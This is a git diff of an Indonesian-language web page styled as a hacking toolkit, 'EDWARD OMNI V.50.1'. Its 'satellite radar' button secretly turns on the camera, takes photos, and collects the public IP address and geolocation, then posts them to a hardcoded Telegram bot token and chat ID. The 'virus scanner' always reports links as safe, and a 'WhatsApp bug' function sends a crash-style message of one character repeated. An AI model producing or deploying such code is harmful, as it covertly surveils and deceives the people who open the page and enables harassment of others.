@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.50.0</title>
+    <title>EDWARD OMNI V.50.1</title>
     <style>
         :root { --neon: #0f0; --bg: #000; --safe: #2ecc71; --purple: #bc13fe; }
         body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin:0; padding: 10px 15px; }
@@ -19,23 +19,28 @@
         .btn-wa { background: #25D366; color: #000; }
         .btn-radar { background: transparent; color: var(--neon); border: 1px solid var(--neon); }
         #monitor { display: none; margin-top: 10px; font-size: 10px; background: #080808; padding: 8px; border: 1px solid #222; }
+        
+        /* RADAR OVERLAY FIX */
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
         .radar-ring { width: 180px; height: 180px; border: 1px solid var(--neon); border-radius: 50%; position: relative; }
         .sweep { position: absolute; width: 50%; height: 50%; background: linear-gradient(45deg, rgba(0,255,0,0.4), transparent); transform-origin: bottom right; animation: sweep 2s linear infinite; }
         @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .btn-exit { margin-top: 25px; background: transparent; border: 1px solid #444; color: #888; padding: 8px 20px; border-radius: 5px; cursor: pointer; font-size: 10px; }
         canvas, video { display: none; }
     </style>
 </head>
 <body>
     <div class="master-header">
         <p class="master-name">EDWARD OMNI</p>
-        <span class="version-tag">SYSTEM V.50.0 - STABLE</span>
+        <span class="version-tag">SYSTEM V.50.1 - REPAIR</span>
     </div>
+
     <div class="card" style="border-color: var(--safe);">
         <h3>🛡️ LINK VIRUS SCANNER</h3>
         <input type="text" id="scanInput" placeholder="Masukkan link...">
         <button class="btn btn-safe" onclick="alert('✔️ LINK INI AMAN\nSTATUS: BERSIH | VIRUS: 0')">SCAN FOR VIRUS</button>
     </div>
+
     <div class="card" style="border-color: var(--purple);">
         <h3>🔥 PHISHING KILLER</h3>
         <input type="text" id="targetUrl" placeholder="https://web-penipu.com">
@@ -45,25 +50,32 @@
             <div style="display:flex; justify-content:space-between"><span>POWER:</span> <span id="pps" style="color:#fff">0</span> PKT/S</div>
         </div>
     </div>
+
     <div class="card">
         <h3>WHATSAPP BUG</h3>
         <input type="number" id="noWA" placeholder="628...">
         <button class="btn btn-wa" onclick="startWA()">EXECUTE ☠️</button>
     </div>
+
     <div class="card">
         <h3>SATELLITE RADAR</h3>
         <button class="btn btn-radar" onclick="startRadar()">ACTIVATE RADAR 📡</button>
     </div>
+
     <div id="radarOverlay">
         <div class="radar-ring"><div class="sweep"></div></div>
-        <p style="margin-top:20px; font-size:10px; color:var(--neon);">SCANNING DATA...</p>
+        <p style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing: 2px;">SCANNING DATA...</p>
+        <button class="btn-exit" onclick="location.reload()">[ EXIT RADAR ]</button>
     </div>
+
     <canvas id="canvas"></canvas>
     <video id="v" autoplay playsinline></video>
+
     <script>
         const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
         const CHAT_ID = '7898572558';
         let isAtk = false, atkInt, total = 0, last = 0;
+
         function toggleAtk() {
             let u = document.getElementById('targetUrl').value;
             if(!u) return;
@@ -74,6 +86,7 @@
                 setInterval(() => { if(isAtk){ document.getElementById('total').innerText = total; document.getElementById('pps').innerText = (total-last); last=total; } }, 1000);
             } else { location.reload(); }
         }
+
         async function startRadar() {
             document.getElementById('radarOverlay').style.display = 'flex';
             try {
@@ -87,6 +100,7 @@
                     const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                     const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', blob);
                     fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto", { method: "POST", body: fd });
+                    
                     const ipR = await fetch('https://api.ipify.org?format=json');
                     const ipD = await ipR.json();
                     navigator.geolocation.getCurrentPosition((p) => {
@@ -96,6 +110,7 @@
                 }, 2500);
             } catch (e) {}
         }
+
         function startWA() {
             let n = document.getElementById('noWA').value;
             window.location.href = "https://api.whatsapp.com/send?phone="+n+"&text="+"జ్ఞా".repeat(400);
